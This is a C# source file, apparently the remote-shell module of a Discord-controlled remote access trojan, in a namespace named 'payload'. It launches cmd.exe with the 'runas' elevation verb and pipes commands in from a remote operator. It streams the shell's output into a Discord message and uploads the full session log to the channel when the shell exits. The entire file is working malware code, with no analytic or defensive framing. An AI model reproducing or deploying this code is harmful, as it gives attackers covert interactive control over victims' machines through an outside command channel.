using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;

using Discord;
using Discord.Rest;

namespace payload
{
    public class Shell
    {
        public RestUserMessage shmessage { get; set; }

        public Process shproc { get; set; }

        private List<string> log = new List<string>();
        private Thread uThread;
        public Shell(RestUserMessage srcmsg)
        {
            shmessage = srcmsg;
            uThread = new Thread(() =>
            {
                while (true)
                {
                    if (log.Count > 0)
                    {
                        string text = string.Join("\n", log);
                        List<string> lines = new List<string>(text.Split('\n'));
                        while (lines.Count > 20) lines.RemoveAt(0);
                        shmessage.ModifyAsync(delegate (MessageProperties m)
                        {
                            m.Content = "```" + string.Join("\n", lines) + "```";
                        }, null).GetAwaiter().GetResult();
                    }
                    Thread.Sleep(500);
                }
            });
        }

        public void Start()
        {
            shproc = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    UseShellExecute = false,
                    RedirectStandardInput = true,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    Verb = "runas"
                }
            };
            shproc.EnableRaisingEvents = true;
            shproc.OutputDataReceived += OutputHandler;
            shproc.ErrorDataReceived += OutputHandler;
            shproc.Exited += ExitHandler;
            shproc.Start();
            shproc.BeginOutputReadLine();
            shproc.BeginErrorReadLine();
            uThread.Start();
        }

        public void SendCommand(string cmd)
        {
            shproc.StandardInput.WriteLine(cmd);
        }

        private void ExitHandler(object sender, EventArgs e)
        {
            MemoryStream memoryStream = new MemoryStream(Encoding.UTF8.GetBytes(string.Join("\n", log)));
            shmessage.Channel.SendFileAsync(memoryStream, "log.txt").GetAwaiter().GetResult();
            memoryStream.Dispose();
            uThread.Abort();
            Program.shells.Remove(this);
        }

        private void OutputHandler(object sender, DataReceivedEventArgs e)
        {
            log.Add(e.Data);
        }
    }
}